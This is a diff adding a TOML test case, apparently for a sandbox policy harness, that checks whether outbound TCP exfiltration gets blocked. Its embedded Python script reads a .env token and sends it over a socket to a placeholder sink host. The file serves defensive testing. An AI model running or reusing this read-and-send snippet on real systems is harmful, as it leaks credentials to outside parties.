@@ -1,0 +1,31 @@
+# The textbook exfiltration: read a dotenv secret, then open a fresh TCP
+# connection to an external host and write the bytes out. The policy must
+# refuse the connect() at its entry, so nothing reaches the external sink.
+name = "connect-tcp-exfil"
+kind = "attack"
+policy = "recommended"
+
+[[files]]
+path = ".env"
+contents = "TOKEN={CANARY}\n"
+
+[[files]]
+path = "send.py"
+contents = """
+import socket
+secret = open(".env", "rb").read()
+s = socket.socket()
+try:
+    s.connect(("{SINK_HOST}", {SINK_PORT}))
+    s.sendall(secret)
+except PermissionError:
+    pass
+"""
+
+[[steps]]
+shell = 0
+run = "python3 send.py"
+expect = "any"
+
+[oracle]
+encodings = ["raw", "base64", "hex"]
